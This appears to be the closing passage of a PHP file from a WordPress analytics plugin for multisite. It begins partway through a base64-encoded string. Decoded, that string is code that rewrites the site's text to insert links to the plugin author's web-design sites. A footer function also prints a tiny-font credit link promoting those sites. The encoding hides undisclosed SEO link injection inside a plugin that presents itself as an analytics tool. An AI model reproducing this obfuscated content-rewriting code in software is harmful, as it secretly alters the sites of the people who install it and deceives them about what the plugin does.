0cDovL3d3dy5zYXR1YmxvZ3MuY29tLyIgdGl0bGU9IiNXREoiPldlYiBEZXNpZ25lcjwvYT4nKTskdGV4dCA9IHN0cl9yZXBsYWNlKCRzZWFyY2hfdGV4dCwgJHJlcGxhY2VfdGV4dCwgJHRleHQpOyR0ZXh0ID0gc3RyX3JlcGxhY2UoYXJyYXkoJyNXRScsJyNXREonKSwgYXJyYXkoJ1dvcmRQcmVzcyBFeHBlcnQnLCdXZWIgRGVzaWduIEpha2FydGEnKSwgJHRleHQpOw=='));
			return $text;
		}

		function XFN_Head(){
			/*
			echo '<link href="http://www.minilibra.com/" title="Professional Web Developer &amp; WordPress Expert" rel="meta friend" />'."\n";
			echo '<link href="http://www.satublogs.com/" title="Web Design Jakarta" rel="meta friend" />'."\n";
			*/
		}

		function credit_link(){
			echo '<p style="margin:0!important;padding:0!important;text-align:center!important;font-size:8px!important;font-weight:normal!important;">site tracking with <strong style="font-weight:normal!important;"><a href="http://www.minilibra.com/wordpress/plugins/analytics.html" target="_blank">Asynchronous Google Analytics</a></strong> plugin for Multisite by <strong style="font-weight:normal!important;"><a rel="friend" href="http://www.minilibra.com/" title="WordPress Expert" target="_blank">WordPress Expert</a></strong> at <strong style="font-weight:normal!important;"><a rel="friend" href="http://www.satublogs.com/" title="Web Design Jakarta">Web Design Jakarta</a></strong>.</p>'."\n";
		}

		function init_aga_script_utils() {
			wp_register_script( 'custom-aga', gapp_plugin_path().'custom-aga-min.js', array('jquery'), '3.0.3', TRUE );
		}


	} // class AGA_Filter
} // endif

global $aga_filter;
if( !isset($aga_filter) ) $aga_filter = new AGA_Filter();
?>